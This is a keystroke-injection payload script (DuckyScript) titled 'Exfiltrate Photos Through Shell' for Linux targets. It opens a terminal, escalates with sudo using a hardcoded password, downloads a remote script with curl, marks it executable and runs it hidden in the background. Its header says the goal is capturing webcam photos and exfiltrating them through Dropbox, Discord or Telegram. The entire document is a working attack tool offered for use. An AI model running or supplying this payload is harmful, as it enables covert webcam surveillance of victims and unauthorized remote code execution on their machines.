REM_BLOCK
##################################################
#                                                #
# Title        : Exfiltrate Photos Through Shell #
# Author       : Aleff                           #
# Version      : 1.0                             #
# Category     : Exfiltration                    #
# Target       : Linux                           #
#                                                #
##################################################
END_REM

REM Requirements:
REM     - Internet Connection
REM     - Dropbox Token for example, but you can use whatever you want for the exfiltration (i.e. smtp e-mail, Discord, Telegram and so on..)
REM     - sudo permissions
REM         - if you need to install 'fswebcam'
REM         - for add the -x permission to the script.sh downloaded

REM REQUIRED - replace example.com with your script.sh link
DEFINE #SCRIPT-SH-LINK example.com

REM REQUIRED - sudo Password
DEFINE #SUDO-PSWD example

EXTENSION DETECT_READY
    REM VERSION 1.1
    REM AUTHOR: Korben

    REM_BLOCK DOCUMENTATION
        USAGE:
            Extension runs inline (here)
            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
            boot delay

        TARGETS:
            Any system that reflects CAPSLOCK will detect minimum required delay
            Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
    END_REM

    REM CONFIGURATION:
    DEFINE #RESPONSE_DELAY 25
    DEFINE #ITERATION_LIMIT 120

    VAR $C = 0
    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
        CAPSLOCK
        DELAY #RESPONSE_DELAY
        $C = ($C + 1)
    END_WHILE
    CAPSLOCK
END_EXTENSION

CTRL-ALT t
DELAY 2000

REM #### Permission ####
REM This section of sudo time depends by the computer power on which it runs.
REM So if you know that the computer on which you run the payload is too slow, increase it by a few seconds, otherwise you can try running it as it is set now or smaller depending on your needs.

STRINGLN sudo su
DELAY 500
STRINGLN #SUDO-PSWD
REM DELAY Based On Computer Power
DELAY 5000

REM If you want to install the dependency of fswebcam you should decommend it.
REM STRINGLN apt install fswebcam -y
REM DELAY Based On Internet Power
REM DELAY 5000

REM #### Script ####
STRINGLN curl #SCRIPT-SH-LINK > script.sh
REM DELAY Based On Internet Power
DELAY 4000

STRINGLN chmod +x script.sh
DELAY 500

STRINGLN nohup ./script.sh > /dev/null 2>&1 & exit